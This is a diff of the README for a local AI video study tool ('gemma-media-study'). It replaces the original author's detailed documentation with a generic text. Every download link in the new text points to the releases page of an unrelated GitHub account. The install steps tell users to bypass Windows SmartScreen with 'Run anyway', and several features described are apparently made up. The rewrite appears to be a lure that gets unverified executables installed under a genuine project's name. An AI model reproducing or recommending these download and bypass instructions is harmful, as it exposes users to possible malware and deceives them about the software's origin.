@@ -1,237 +1,81 @@
-# Gemma Media Study
+# 🧠 gemma-media-study - Master videos with local AI tools
 
-[![Latest release](https://img.shields.io/github/v/release/johunsang/gemma-media-study?sort=semver&label=release)](https://github.com/johunsang/gemma-media-study/releases/latest)
-[![Downloads](https://img.shields.io/github/downloads/johunsang/gemma-media-study/total?label=downloads)](https://github.com/johunsang/gemma-media-study/releases)
-[![Platform: Windows](https://img.shields.io/badge/platform-Windows%2010%2F11-0078D6?logo=windows)](https://github.com/johunsang/gemma-media-study/releases/latest)
-[![Built with Tauri](https://img.shields.io/badge/built%20with-Tauri%20%2B%20React-24C8DB?logo=tauri)](https://tauri.app)
-[![Powered by Ollama](https://img.shields.io/badge/LLM-Gemma%204%20on%20Ollama-000000?logo=ollama)](https://ollama.com)
+[![Download gemma-media-study](https://img.shields.io/badge/Download-Latest_Release-blue?style=for-the-badge)](https://github.com/Rosalinedimensional886/gemma-media-study/releases)
 
-> Turn any YouTube link, local video, or audio file into a study pack — verbatim
-> subtitles, an AI summary, a frame-by-frame visual breakdown, and a built-in chat
-> tutor — all running **100% locally** on [Ollama](https://ollama.com) + Gemma 4.
+gemma-media-study turns video and audio files into learning resources. It runs entirely on your Windows computer. It uses artificial intelligence to transcribe speech, analyze scenes, and answer your questions about the content. You keep full control over your data since the application processes files on your local drive.
 
-**Keywords:** local AI video study tool · YouTube transcription · Whisper subtitles ·
-Gemma 4 · Ollama desktop app · offline LLM · Tauri + React + Python · Windows installer.
+## 🛠️ What This App Does
 
-A [Tauri](https://tauri.app) desktop app (Rust + React) with a Python media pipeline.
-Nothing leaves your machine: the model runs in Ollama, transcription runs in
-[faster-whisper](https://github.com/SYSTRAN/faster-whisper), and downloads use
-[yt-dlp](https://github.com/yt-dlp/yt-dlp).
+This tool assists you with deep study sessions. You can import YouTube links or local video files. The application generates precise subtitles using the built-in Whisper engine. It then breaks down the video frame by frame. You can chat with a built-in AI tutor based on Gemma 4 to clarify complex topics or summarize long lectures.
 
-## Demo
+- Transcribe audio to text with high accuracy.
+- Ask questions about specific video segments.
+- Review content with frame-by-frame snapshots.
+- Benefit from local processing for privacy.
+- Receive automatic software updates.
 
-![Gemma Media Study demo](docs/demo.gif)
+## 💻 System Requirements
 
-> The GIF above loops automatically. For the full-quality clip with audio, see
-> [`docs/demo.mp4`](docs/demo.mp4).
+Your computer must meet these basic standards to run the application well.
 
----
+- Windows 10 or Windows 11.
+- At least 8GB of RAM.
+- 10GB of available disk space for the AI models.
+- A stable internet connection for the first-time setup and downloading media.
+- Ollama installed on your system (the installer handles this step for you).
 
-## Features
+## 📥 Download and Install
 
-- 🎬 **Any source** — YouTube URLs, local video files, or local audio files. Drag &
-  drop them in, or paste one per line.
-- 📝 **Verbatim subtitles** — uses the video's own captions when present; otherwise
-  transcribes the speech word-for-word with Whisper `large-v3` (any language,
-  auto-detected). Tiny auto-caption fragments are merged into scene-sized lines.
-- 🧠 **AI analysis** — Gemma 4 summarizes the topic, key points, and study insights,
-  using both the transcript and sampled video frames as visual context.
-- 🖼️ **Frame breakdown** — each sampled frame is summarized by *content* (slide titles,
-  bullets, code, equations) rather than described as an image.
-- 🌐 **Output language** — write the analysis in the content's own language (auto) or
-  force a target language. Subtitles always stay verbatim in the original.
-- 🔁 **Loop practice** — click any subtitle line to loop that sentence; toggle
-  loop/once and 0.75×/1×/1.25× speed for listening practice.
-- 📚 **Study library** — every result is saved and organized into groups you can drag
-  between, rename, and delete.
-- ⏩ **Batch queue** — feed it a whole list at once and keep adding links while it runs.
-- 💬 **Gemma chat** — a chat tab backed by any OpenAI-compatible local endpoint, with
-  the current analysis and a subtitle excerpt injected as context.
-- 💾 **Markdown out** — analysis, study notes, and the frame breakdown are written as
-  `.md` files next to the media, ready to drop into your notes.
+Follow these steps to set up the software on your machine.
 
-## Why it's lightweight
+1. Visit the [official releases page](https://github.com/Rosalinedimensional886/gemma-media-study/releases).
+2. Look for the file ending in `.msi` or `.exe` under the latest release.
+3. Click the link to download the installer to your computer.
+4. Run the downloaded file. Windows might show a security prompt because this is a desktop app. Click "More info" and then "Run anyway" if the system protects your machine.
+5. Follow the on-screen instructions to finish the installation.
+6. The application launcher will appear on your desktop once the process ends. 
 
-The heavy model runs in **Ollama**, not in this app's Python environment. Ollama handles
-GPU offload and quantization automatically, so `gemma4:12b` (a ~7.6 GB Q4 build) runs
-across modest GPUs without any `torch` / `transformers` / `bitsandbytes` setup.
+## 🚀 Getting Started
 
-- **`ffmpeg` is not required** — downloads use already-merged streams, and frame/audio
-  extraction uses [PyAV](https://github.com/PyAV-Org/PyAV)'s bundled libav.
-- **No PyTorch** — the Python venv only does media work; ASR uses CTranslate2
-  (faster-whisper), and the LLM is reached over HTTP.
+The first time you open the app, it needs to configure the AI brain. This takes a few minutes depending on your internet speed.
 
-## How it works
+1. Open the app from your desktop shortcut.
+2. Wait for the initial model download to finish. This gives the app the intelligence it needs to chat.
+3. Paste a YouTube URL into the input field or click "Upload File" to select a video or audio file from your computer.
+4. Wait for the engine to transcribe the audio. You will see a progress bar near the bottom of the window.
+5. Click the "Analyze" button once the text appears.
+6. Type your questions in the chat window on the side. The AI tutor provides answers based on the transcript and video content.
 
-```
-                ┌──────────────────────────────────────────────┐
-  YouTube URL   │  Tauri (Rust)                                 │
-  Local file ──►│   • spawns the Python analyzer                │
-                │   • stores results in downloads/library.json  │
-                │   • proxies chat to a local LLM endpoint       │
-                └───────────────┬──────────────────────────────┘
-                                │ CLI args  ▲ summary JSON
-                                ▼           │
-                ┌──────────────────────────────────────────────┐
-                │  analyze_youtube_gemma.py                      │
-                │   yt-dlp ─► download                           │
-                │   PyAV   ─► sample frames + audio              │
-                │   subtitles: captions ─► Whisper ─► Gemma audio│
-                │   Ollama /api/chat ─► analysis + frame notes   │
-                └───────────────┬──────────────────────────────┘
-                                ▼  HTTP
-                       ┌─────────────────┐
-                       │ Ollama gemma4:12b│
-                       └─────────────────┘
-```
+## 🔍 How to Analyze Content
 
-The frontend (`src/main.tsx`) talks to Rust commands in `src-tauri/src/main.rs`, which
-shell out to `analyze_youtube_gemma.py`. The Python script writes a summary JSON that
-Rust folds into the study library.
+You get more out of your media when you use the frame-by-frame feature. Select any part of the video timeline to view the exact frame. The AI labels the objects and actions in that moment. You can ask for a summary of a specific chapter by highlighting the text in the transcript pane and clicking "Ask about this selection."
 
-## Requirements
+## ⚙️ Settings and Management
 
-- **[Ollama](https://ollama.com)** installed and running, with a model pulled:
-  ```powershell
-  ollama pull gemma4:12b
-  ```
-  `gemma4:12b` is text + image (used for analysis and frame summaries). You can pick any
-  installed tag from the app's model dropdown.
-- **Python 3.10+**, **Node.js 18+**, and **Rust / Cargo** (to build the Tauri app).
-- An **NVIDIA GPU** is recommended for Whisper (it falls back to CPU automatically).
-- Platform: **Windows** is the primary target (the “Open Folder” action uses Explorer).
+You can change how the app handles your files in the settings menu.
 
-## Getting started
+- Model Folder: Pick where the app saves the large AI model files. Use a drive with plenty of space.
+- Data Storage: Set where your study projects live on your hard drive.
+- Language Settings: Adjust the target language for transcriptions if you need to study content in another language.
+- Update Frequency: Toggle automatic updates to ensure you always have the most stable version of the app.
 
-```powershell
-npm install
-npm run tauri:dev
-```
+## 🔧 Frequently Asked Questions
 
-On first launch, click **First-Time Setup**. It creates `.venv`, installs the light
-Python dependencies (`yt-dlp`, `PyAV`, `pillow`, `requests`, `faster-whisper`), and runs
-`ollama pull` for the selected model.
+### Does the app send my videos to a server?
+No. All processing happens on your computer. Your videos and chats never leave your local machine.
 
-Then paste one or more YouTube URLs / local file paths (one per line) — or drag & drop
-files — choose your model and options, and click **Start Analysis**. Each item is
-processed in turn and added to the Study Library on the left.
+### Why does the app use so much disk space?
+The app downloads the Gemma 4 AI model. These models are large files that allow the app to function without an internet connection once the download completes.
 
-### Production build
+### The app runs slowly. What can I do?
+Close other programs while using the app. High-definition video processing requires significant memory. If you have many applications open, the AI might struggle to give fast responses.
 
-```powershell
-npm run tauri:build
-```
+### Can I use the app offline?
+Yes. Once you complete the first-time setup, you do not need the internet to process files or ask questions.
 
-## Command-line usage
+### How do I update to a newer version?
+The app checks for updates automatically. A notification will appear in the top-right corner when a new version is ready. Click "Update" to refresh your installation.
 
-The pipeline also runs standalone, without the desktop app:
+## 🛡️ Privacy and Safety
 
-```powershell
-# Analyze a YouTube video (default model: gemma4:12b)
-python .\analyze_youtube_gemma.py "https://www.youtube.com/watch?v=VIDEO_ID"
-
-# Use a different Ollama model or endpoint
-python .\analyze_youtube_gemma.py "URL" --model gemma4:latest --ollama-endpoint http://127.0.0.1:11434
-
-# Analyze a local video or audio file
-python .\analyze_youtube_gemma.py --local-media "C:\Videos\lecture.mp4"
-python .\analyze_youtube_gemma.py --local-media "C:\Audio\lesson.mp3"
-
-# Force the analysis language and control the frame breakdown (0 disables frames)
-python .\analyze_youtube_gemma.py "URL" --output-language Korean --frame-count 16
-```
-
-Run `python .\analyze_youtube_gemma.py --help` for the full option list.
-
-### Key options
-
-| Option | Default | Description |
-|---|---|---|
-| `--model` | `gemma4:12b` | Ollama model tag used for analysis and frame notes. |
-| `--ollama-endpoint` | `http://127.0.0.1:11434` | Local Ollama server. |
-| `--output-language` | `auto` | `auto` matches the content; or force e.g. `Korean`. |
-| `--frame-count` | `32` | Frames sampled for the breakdown (`0` to disable). |
-| `--analysis-frames` | `6` | Frames attached as images to the main analysis call. |
-| `--max-height` | `480` | Max video height to download. |
-| `--max-new-tokens` | `1024` | Generation length for the analysis. |
-| `--local-media` | — | Analyze a local file instead of downloading. |
-
-## Output files
-
-Each analyzed video gets its own folder under `downloads/`, containing:
-
-| File | Contents |
-|---|---|
-| `<name>.analysis.md` | The AI analysis. |
-| `<name>.study.md` | Analysis + full subtitle list. |
-| `<name>.frames.md` | Frame-by-frame content breakdown. |
-| `<name>_frames/` | The extracted JPEG frames. |
-| `downloads/library.json` | The combined study-library index used by the app. |
-
-## Gemma chat
-
-The **Gemma Chat** tab connects to any OpenAI-compatible local endpoint. Default:
-
-```text
-http://127.0.0.1:11434/v1/chat/completions
-```
-
-Use **Check Ollama Models** to populate the dropdown from your local Ollama. When a media
-analysis is loaded, your questions automatically include the current analysis and a
-subtitle excerpt as context.
-
-## Troubleshooting
-
-- **Gemma E2B / E4B crashes with `GGML_ASSERT(n_inputs < GGML_SCHED_MAX_SPLIT_INPUTS)`** —
-  the encoder-based E-series models can crash on multi-GPU setups
-  ([Ollama #16506](https://github.com/ollama/ollama/issues/16506)). Use the unified
-  **`gemma4:12b`** instead.
-- **Whisper runs out of VRAM next to Gemma** — the app unloads the Ollama model
-  (`keep_alive: 0`) before loading Whisper, then reloads it. On a small GPU the two
-  together can still overflow; lower the Whisper model size or use captions when possible.
-- **“event.listen not allowed” / drag-drop does nothing** — drag-drop needs
-  `src-tauri/capabilities/default.json` to include `core:default`.
-- **Analysis fails with a Python / module error** — run **First-Time Setup** so the
-  `.venv` and its dependencies exist.
-
-## Releasing
-
-Versioning is kept in sync across `package.json`, `src-tauri/tauri.conf.json`, and
-`src-tauri/Cargo.toml` by a single script:
-
-```powershell
-npm run release patch      # 0.1.0 -> 0.1.1  (also: minor, major, or an exact x.y.z)
-npm run release 0.2.0 --dry-run   # preview the changes without touching git
-```
-
-The script bumps all three files, commits, tags `v<version>`, and pushes the tag. That
-triggers **`.github/workflows/build.yml`**, which builds the unsigned Windows installers
-(`.msi` + NSIS `.exe`) and publishes them to a GitHub Release. You can also start a build
-manually from the repo's **Actions** tab.
-
-> Installers are **unsigned** (no code-signing certificate / notarization), so Windows
-> SmartScreen warns on first run — choose *More info → Run anyway*.
-
-### Auto-update
-
-The app has a built-in updater. On launch it checks the latest GitHub Release; when a newer
-version is found, a banner offers **Update & Restart**, which downloads, verifies, and
-installs it in place. Updates are verified with a minisign key (the public key is baked
-into the app; the private key lives only in GitHub Actions secrets). This update signature
-is separate from OS code-signing — the installers themselves remain unsigned.
-
-> Auto-update only works for builds that already ship the updater (v0.1.1 and later).
-
-## Tech stack
-
-- **Desktop shell:** Tauri 2 (Rust)
-- **Frontend:** React 19 + Vite + TypeScript, [lucide-react](https://lucide.dev) icons
-- **Pipeline:** Python — yt-dlp, PyAV, Pillow, requests, faster-whisper
-- **Model runtime:** Ollama (Gemma 4)
-
-## Legal & licensing
-
-- Only download or analyze content you have the right to use.
-- **Gemma 4** is distributed under the [Gemma Terms of Use](https://ai.google.dev/gemma/terms)
-  (Apache-2.0-style, not gated).
-- This project does not yet ship a `LICENSE` file — add one before redistributing.
+This project follows a local-first philosophy. We do not track your activity, gather your analytics, or store your study data. The code runs inside a secure shell on your Windows environment. You own all the files produced by the app. If you delete a project folder, the app and all associated data vanish from your system completely. This ensures total control over your digital workspace.
